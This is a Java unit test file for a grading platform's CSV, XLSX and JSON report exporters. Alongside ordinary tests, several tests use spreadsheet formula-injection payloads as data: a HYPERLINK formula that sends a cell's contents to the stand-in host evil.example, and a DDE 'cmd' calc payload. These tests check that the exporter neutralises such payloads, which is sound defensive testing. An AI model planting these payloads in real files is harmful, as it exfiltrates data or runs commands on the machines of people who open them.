/*
 * Copyright the GitGrader contributors.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package org.gitgrader.reports;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.math.BigDecimal;
import java.nio.charset.StandardCharsets;
import java.time.Clock;
import java.time.Instant;
import java.time.ZoneOffset;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.stream.IntStream;

import org.apache.poi.ss.usermodel.Cell;
import org.apache.poi.ss.usermodel.CellType;
import org.apache.poi.ss.usermodel.Row;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;
import org.gitgrader.courses.EnrollmentStatus;
import org.gitgrader.grading.GradingRunStatus;
import org.gitgrader.grading.SubmissionScoreView;
import org.gitgrader.identity.StudentStatus;
import org.gitgrader.submissions.SubmissionStatus;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import tools.jackson.databind.JsonNode;
import tools.jackson.databind.ObjectMapper;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Tests for {@link CsvReportExporter}, {@link XlsxReportExporter} and
 * {@link JsonReportExporter}.
 *
 * <p>
 * These carry names a student typed into an open registration form, so a cell starting
 * with a character a spreadsheet treats as a formula must arrive as text. RFC quoting is
 * no defence: the reader strips the quotes and reads the leading {@code =}, which is
 * enough for {@code HYPERLINK}, {@code WEBSERVICE} or DDE.
 */
class ReportExporterTest {

	private static final UUID COURSE_ID = UUID.fromString("00000000-0000-0000-0000-000000000001");

	private static final UUID STUDENT_ID = UUID.fromString("00000000-0000-0000-0000-000000000002");

	private static final Clock CLOCK = Clock.fixed(Instant.parse("2026-07-30T12:00:00Z"), ZoneOffset.UTC);

	@Test
	@DisplayName("quotes CSV fields that contain commas, quotes or newlines")
	void quotesCsvFieldsContainingCommasQuotesAndNewlines() {
		CourseReport report = report("Lovelace, \"Ada\"\nCountess");

		String csv = new String(new CsvReportExporter().export(report), StandardCharsets.UTF_8);

		assertThat(csv).contains("\"Lovelace, \"\"Ada\"\"\nCountess\"");
	}

	@Test
	@DisplayName("creates an XLSX workbook a reader can open")
	void createsReadableXlsxWorkbook() throws IOException {
		CourseReport report = report("Ada Lovelace");

		byte[] bytes = new XlsxReportExporter().export(report);

		try (XSSFWorkbook workbook = new XSSFWorkbook(new ByteArrayInputStream(bytes))) {
			assertThat(workbook.getSheet("Course report").getRow(1).getCell(2).getStringCellValue())
				.isEqualTo("Ada Lovelace");
		}
	}

	@Test
	@DisplayName("exports every student of a class with assignment progress and the latest result")
	void exportsEveryClassStudentWithAssignmentProgressAndLatestResult() throws IOException {
		UUID secondStudentId = UUID.fromString("00000000-0000-0000-0000-000000000003");
		UUID submissionId = UUID.fromString("00000000-0000-0000-0000-000000000004");
		UUID assignmentId = UUID.fromString("00000000-0000-0000-0000-000000000006");
		ClassProgressReport.AssignmentProgress assignmentProgress = new ClassProgressReport.AssignmentProgress(
				new BigDecimal("75.00"), new BigDecimal("7.50"),
				new ClassProgressReport.LatestSubmission(submissionId, "abc123", "refs/heads/main", "Latest work",
						CLOCK.instant(), SubmissionStatus.PASSED, false),
				new SubmissionScoreView(submissionId, 2, GradingRunStatus.COMPLETED, 3, 4, new BigDecimal("75.00"),
						new BigDecimal("7.50"), true, CLOCK.instant()));
		ClassProgressReport report = new ClassProgressReport(COURSE_ID,
				UUID.fromString("00000000-0000-0000-0000-000000000005"), "class-a", "Class A", 1,
				new BigDecimal("10.00"),
				List.of(new ClassProgressReport.AssignmentSummary(assignmentId, "assignment-one", "Assignment One",
						true, new BigDecimal("10.00"), 4, 1, 1, 0, 0, 1, new BigDecimal("75.00"))),
				List.of(classStudent(STUDENT_ID, "s1", "Ada Lovelace", assignmentProgress),
						classStudent(secondStudentId, "s2", "Grace Hopper", null)));

		byte[] bytes = new ReportExportService(List.of(new XlsxReportExporter())).exportClassReport(report);

		try (XSSFWorkbook workbook = new XSSFWorkbook(new ByteArrayInputStream(bytes))) {
			var sheet = workbook.getSheet("Class report");
			assertThat(sheet.getLastRowNum()).isEqualTo(2);
			assertThat(sheet.getRow(1).getCell(1).getStringCellValue()).isEqualTo("s1");
			assertThat(sheet.getRow(2).getCell(1).getStringCellValue()).isEqualTo("s2");
			Row header = sheet.getRow(0);
			assertThat(sheet.getRow(1).getCell(column(header, "assignment-one Best percent")).getStringCellValue())
				.isEqualTo("75.00");
			assertThat(
					sheet.getRow(1).getCell(column(header, "assignment-one Latest score percent")).getStringCellValue())
				.isEqualTo("75.00");
			assertThat(sheet.getRow(1).getCell(column(header, "assignment-one Tests passed")).getStringCellValue())
				.isEqualTo("3");
			assertThat(sheet.getRow(2)
				.getCell(column(header, "assignment-one Latest submission status"))
				.getStringCellValue()).isEmpty();
		}
	}

	@Test
	@DisplayName("blanks only the columns whose source is absent")
	void blanksOnlyTheColumnsWhoseSourceIsAbsent() throws IOException {
		UUID submissionId = UUID.fromString("00000000-0000-0000-0000-000000000004");
		UUID assignmentId = UUID.fromString("00000000-0000-0000-0000-000000000006");
		ClassProgressReport.AssignmentProgress noSubmissionYet = new ClassProgressReport.AssignmentProgress(
				new BigDecimal("25.00"), new BigDecimal("2.50"), null, null);
		ClassProgressReport.AssignmentProgress stillGrading = new ClassProgressReport.AssignmentProgress(
				new BigDecimal("25.00"), new BigDecimal("2.50"), null,
				new SubmissionScoreView(submissionId, 1, GradingRunStatus.RUNNING, 0, 4, null, null, null, null));
		ClassProgressReport report = new ClassProgressReport(COURSE_ID,
				UUID.fromString("00000000-0000-0000-0000-000000000005"), "class-a", "Class A", 1,
				new BigDecimal("10.00"),
				List.of(new ClassProgressReport.AssignmentSummary(assignmentId, "assignment-one", "Assignment One",
						true, new BigDecimal("10.00"), 4, 1, 1, 0, 0, 1, new BigDecimal("25.00"))),
				List.of(classStudent(STUDENT_ID, "s1", "Ada Lovelace", noSubmissionYet), classStudent(
						UUID.fromString("00000000-0000-0000-0000-000000000003"), "s2", "Grace Hopper", stillGrading)));

		byte[] bytes = new ReportExportService(List.of(new XlsxReportExporter())).exportClassReport(report);

		try (XSSFWorkbook workbook = new XSSFWorkbook(new ByteArrayInputStream(bytes))) {
			var sheet = workbook.getSheet("Class report");
			Row header = sheet.getRow(0);
			List<String> withoutSubmission = assignmentCells(sheet.getRow(1), header);
			List<String> whileGrading = assignmentCells(sheet.getRow(2), header);

			assertThat(withoutSubmission).containsExactly("25.00", "2.50", "", "", "", "", "", "", "");
			// A grading run that has not finished still knows its own test counters.
			assertThat(whileGrading).containsExactly("25.00", "2.50", "", "", "", "", "0", "4", "RUNNING");
		}
	}

	@Test
	@DisplayName("keeps earned and available points distinct in the JSON export")
	void keepsEarnedAndAvailablePointsDistinctInJson() throws IOException {
		// Deliberately different values: an earlier defect reported the earned total in
		// the available-points field, which is invisible whenever a fixture uses the same
		// number for both.
		StudentProgressRow row = new StudentProgressRow(STUDENT_ID, "s1", "Ada Lovelace", 0, 1, 0,
				new BigDecimal("0.70"), new BigDecimal("7"), new BigDecimal("0.70"), new BigDecimal("10"), 1,
				CLOCK.instant(), Map.of());
		CourseReport report = new CourseReport(COURSE_ID, 1, new BigDecimal("10"), List.of(row));

		JsonNode student = new ObjectMapper().readTree(new JsonReportExporter(new ObjectMapper()).export(report))
			.get("students")
			.get(0);

		assertThat(student.get("pointsEarned").decimalValue()).isEqualByComparingTo("7");
		assertThat(student.get("totalPoints").decimalValue()).isEqualByComparingTo("10");
		assertThat(student.get("studentUsername").asString()).isEqualTo("s1");
	}

	@Test
	@DisplayName("serialises a student who has never submitted")
	void serialisesAStudentWhoHasNeverSubmitted() throws IOException {
		// A student with no activity is the ordinary state at the start of a course, so
		// the absent timestamp must serialise rather than fail the whole course export.
		StudentProgressRow row = new StudentProgressRow(STUDENT_ID, "s2", "Grace Hopper", 0, 0, 3, BigDecimal.ZERO,
				BigDecimal.ZERO, BigDecimal.ZERO, new BigDecimal("10"), 0, null, Map.of());

		byte[] json = new JsonReportExporter(new ObjectMapper())
			.export(new CourseReport(COURSE_ID, 3, new BigDecimal("10"), List.of(row)));

		JsonNode student = new ObjectMapper().readTree(json).get("students").get(0);
		assertThat(student.get("lastActivityAt").isNull()).isTrue();
		assertThat(student.get("submissionCount").asLong()).isZero();
	}

	@Test
	@DisplayName("neutralises a spreadsheet formula in a student-supplied name")
	void neutralisesASpreadsheetFormulaInAStudentSuppliedName() {
		// Registration is open to anyone and puts no character restriction on a name, so
		// this is what a student can put in the instructor's spreadsheet. Opening the
		// export - which is what an export is for - evaluates it: HYPERLINK and
		// WEBSERVICE reach the network with the row's contents, and DDE has reached the
		// shell. RFC quoting is not a defence, because the spreadsheet strips the quotes
		// and then reads the leading '='. The cell has to arrive as the text it is.
		CourseReport report = report("=HYPERLINK(\"https://evil.example/?d=\"&A2,\"Grades\")");

		String csv = new String(new CsvReportExporter().export(report), StandardCharsets.UTF_8);

		assertThat(csv).doesNotContain(",=HYPERLINK").doesNotContain(",\"=HYPERLINK");
		assertThat(csv).contains("HYPERLINK");
	}

	@Test
	@DisplayName("stores the same formula in an XLSX cell as text, not as a formula")
	void storesFormulaInXlsxCellAsText() throws IOException {
		// XLSX never prefixes the value, so nothing here would notice a regression to a
		// formula cell: POI decides between a string cell and an evaluated formula from
		// the type alone, and a reader that opens the workbook would run whatever the
		// cell holds. The guard is the cell type, and it has to be asserted as one.
		String name = "=HYPERLINK(\"https://evil.example/?d=\"&A2,\"Grades\")";

		byte[] bytes = new XlsxReportExporter().export(report(name));

		try (XSSFWorkbook workbook = new XSSFWorkbook(new ByteArrayInputStream(bytes))) {
			Cell cell = workbook.getSheet("Course report").getRow(1).getCell(2);
			assertThat(cell.getCellType()).isEqualTo(CellType.STRING);
			assertThat(cell.getStringCellValue()).isEqualTo(name);
		}
	}

	@Test
	@DisplayName("neutralises every character a spreadsheet treats as a formula")
	void neutralisesEveryCharacterASpreadsheetTreatsAsAFormula() {
		for (String lead : List.of("=", "+", "-", "@", "\t", "\r")) {
			String csv = new String(new CsvReportExporter().export(report(lead + "cmd|'/c calc'!A0")),
					StandardCharsets.UTF_8);

			assertThat(csv).as("a cell may not begin with %s", lead)
				.doesNotContain("," + lead)
				.doesNotContain(",\"" + lead);
		}
	}

	@Test
	@DisplayName("leaves an ordinary name alone")
	void leavesAnOrdinaryNameAlone() {
		// The guard must not reach names that were never dangerous, or every exported
		// spreadsheet acquires punctuation nobody typed.
		String csv = new String(new CsvReportExporter().export(report("Ada Lovelace")), StandardCharsets.UTF_8);

		assertThat(csv).contains(",Ada Lovelace,");
	}

	private static CourseReport report(String fullName) {
		StudentProgressRow row = new StudentProgressRow(STUDENT_ID, "s1", fullName, 1, 0, 0, BigDecimal.ONE,
				BigDecimal.TEN, BigDecimal.ONE, BigDecimal.TEN, 1, CLOCK.instant(), Map.of());
		return new CourseReport(COURSE_ID, 1, BigDecimal.TEN, List.of(row));
	}

	private static ClassProgressReport.StudentRow classStudent(UUID studentId, String username, String fullName,
			ClassProgressReport.AssignmentProgress progress) {
		Map<String, ClassProgressReport.AssignmentProgress> assignments = progress == null ? Map.of()
				: Map.of("assignment-one", progress);
		return new ClassProgressReport.StudentRow(studentId, username, fullName, StudentStatus.VERIFIED_BY_INSTRUCTOR,
				EnrollmentStatus.ACTIVE, 1, 0, 0, BigDecimal.ONE, new BigDecimal("7.50"), new BigDecimal("0.75"),
				new BigDecimal("10.00"), progress == null ? 0 : 1, progress == null ? null : CLOCK.instant(),
				assignments);
	}

	private static List<String> assignmentCells(Row row, Row header) {
		int first = column(header, "assignment-one Best percent");
		return IntStream.range(first, row.getLastCellNum())
			.mapToObj(row::getCell)
			.map(cell -> cell.getStringCellValue())
			.toList();
	}

	private static int column(Row header, String name) {
		for (int index = 0; index < header.getLastCellNum(); index++) {
			if (header.getCell(index).getStringCellValue().equals(name)) {
				return index;
			}
		}
		throw new AssertionError("Missing workbook column: " + name);
	}

}
